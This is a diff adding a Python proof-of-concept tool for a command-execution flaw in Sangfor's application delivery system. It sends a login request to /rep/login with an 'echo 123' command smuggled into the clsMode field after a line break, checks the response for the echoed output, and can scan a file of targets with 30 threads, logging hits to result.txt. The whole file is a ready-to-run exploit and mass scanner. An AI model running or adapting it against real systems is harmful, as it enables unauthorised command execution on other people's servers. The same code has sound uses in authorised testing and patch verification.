@@ -1,0 +1,60 @@
+#导包
+import requests,argparse,sys,re
+from multiprocessing.dummy import Pool
+#关闭警告
+requests.packages.urllib3.disable_warnings()
+def banner():
+    test="""
+        __     __  ___          __          ____  ____________
+  _____/ /____/  |/  /___  ____/ /__       / __ \/ ____/ ____/
+ / ___/ / ___/ /|_/ / __ \/ __  / _ \     / /_/ / /   / __/   
+/ /__/ (__  ) /  / / /_/ / /_/ /  __/    / _, _/ /___/ /___   
+\___/_/____/_/  /_/\____/\__,_/\___/____/_/ |_|\____/_____/   
+                                  /_____/                     
+"""
+    print(test)
+def main():
+    # 处理命令参数
+    banner()
+    parser = argparse.ArgumentParser(description='深信服应用交付系统命令执行漏洞')
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please input a url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='Please input a file')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8') as fb:
+            for url in fb.readlines():
+                url_list.append(url.strip())
+        mp = Pool(30)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+def poc(target):
+    payload='/rep/login'
+    headers={
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
+        'Accept-Encoding': 'gzip, deflate',
+        'Content-Type': 'application/x-www-form-urlencoded',
+    }
+    proxies={
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:8080'
+    }
+    data='userID=admin&userPsw=admin&page=login&log_type=report&index=index&clsMode=cls_mode_login\r\necho 123'
+    try:
+        res = requests.post(url=target+payload,headers=headers,proxies=proxies,data=data,timeout=15,verify=False)
+        #print(res.text)
+        match = re.search(r'cls_mode_login%0D(\d+)', res.text)
+        #print(match.group(1))
+        if match.group(1) == '123':
+            print(f'[+]{target} have loopholes {target+payload}')
+            with open('result.txt','a',encoding='utf-8') as fn:
+                fn.write(target.strip()+'\n')
+    except:
+        pass
+if __name__ == "__main__":
+    main()
